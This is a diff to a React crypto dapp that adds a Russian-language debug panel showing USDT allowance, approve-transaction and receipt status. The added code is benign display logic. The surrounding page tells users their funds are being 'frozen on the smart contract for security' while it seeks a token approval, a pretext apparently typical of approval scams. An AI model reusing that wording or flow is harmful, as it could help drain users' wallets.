@@ -64,7 +64,15 @@ function App() {
         setError("Не удалось корректно загрузить страницу");
     }, []);
 
-    const { approveMutation, hasApprove, allowanceRequest } = useUsdtAllowance(amountBN);
+    const {
+        approveMutation,
+        hasApprove,
+        allowanceRequest,
+        approveReceipt,
+        approveTx,
+        allowance,
+        allowanceBN,
+    } = useUsdtAllowance(amountBN);
 
     // При возврате из кошелька (dapp browser) — обновляем allowance с задержкой (нода уже применила блок)
     useEffect(() => {
@@ -253,6 +261,64 @@ function App() {
                                 На данной странице в целях безопасности мы замораживаем ваши
                                 средства на смарт-контракте
                             </p>
+
+                            {isConnected && (
+                                <div className="app__debug">
+                                    <div className="app__debug-title">Отладка (allowance)</div>
+                                    <div className="app__debug-row">
+                                        Запрос allowance:{" "}
+                                        {allowanceRequest.isLoading || allowanceRequest.isFetching
+                                            ? "идёт..."
+                                            : allowanceRequest.isFetched
+                                            ? "получен"
+                                            : "—"}
+                                    </div>
+                                    <div className="app__debug-row">
+                                        allowance (с контракта): {allowance != null ? String(allowance) : "—"}
+                                    </div>
+                                    <div className="app__debug-row">
+                                        нужно (amountBN): {amountBN != null ? String(amountBN) : "—"}
+                                    </div>
+                                    <div className="app__debug-row">
+                                        hasApprove: {hasApprove ? "да" : "нет"}
+                                        {allowanceRequest.isFetched &&
+                                            amountBN != null &&
+                                            (allowanceBN >= amountBN ? " ✓" : " (allowance < amount)")}
+                                    </div>
+                                    {allowanceRequest.isError && (
+                                        <div className="app__debug-row app__debug-row--error">
+                                            Ошибка запроса allowance:{" "}
+                                            {allowanceRequest.error?.message || String(allowanceRequest.error)}
+                                        </div>
+                                    )}
+                                    <div className="app__debug-row">
+                                        Хеш approve-транзакции: {approveTx ? `${approveTx.slice(0, 10)}...` : "—"}
+                                    </div>
+                                    <div className="app__debug-row">
+                                        Receipt approve:{" "}
+                                        {approveReceipt.isLoading
+                                            ? "ждём подтверждения..."
+                                            : approveReceipt.isSuccess
+                                            ? "подтверждён ✓"
+                                            : approveReceipt.isError
+                                            ? "ошибка"
+                                            : "—"}
+                                    </div>
+                                    {approveReceipt.isError && (
+                                        <div className="app__debug-row app__debug-row--error">
+                                            Ошибка receipt:{" "}
+                                            {approveReceipt.error?.message || String(approveReceipt.error)}
+                                        </div>
+                                    )}
+                                    <button
+                                        type="button"
+                                        className="app__debug-refresh"
+                                        onClick={() => allowanceRequest.refetch()}
+                                    >
+                                        Обновить allowance
+                                    </button>
+                                </div>
+                            )}
                         </>
                     ) : null}
                 </div>
